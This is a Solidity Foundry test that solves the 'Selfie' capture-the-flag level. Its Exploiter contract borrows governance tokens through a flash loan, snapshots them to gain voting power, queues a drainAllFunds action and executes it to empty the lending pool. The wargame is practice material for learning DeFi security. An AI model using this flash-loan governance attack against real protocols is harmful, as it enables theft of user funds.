// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        Exploiter exploiter =
            new Exploiter(address(simpleGovernance), address(selfiePool), address(dvtSnapshot), attacker);
        exploiter.attack();
        vm.warp(block.timestamp + 2 days);
        exploiter.drainFunds();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract Exploiter {
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address internal attacker;
    uint256 public actionId;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    constructor(
        address simpleGovernanceAddress,
        address selfiePoolAddress,
        address dvtSnapshotAddress,
        address attackerAddress
    ) {
        simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
        selfiePool = SelfiePool(selfiePoolAddress);
        dvtSnapshot = DamnValuableTokenSnapshot(dvtSnapshotAddress);
        attacker = attackerAddress;
    }

    function attack() public {
        selfiePool.flashLoan(TOKENS_IN_POOL);
    }

    function receiveTokens(address token, uint256 amount) public {
        dvtSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0
        );
        dvtSnapshot.transfer(address(selfiePool), amount);
    }

    function drainFunds() public {
        simpleGovernance.executeAction(actionId);
    }
}
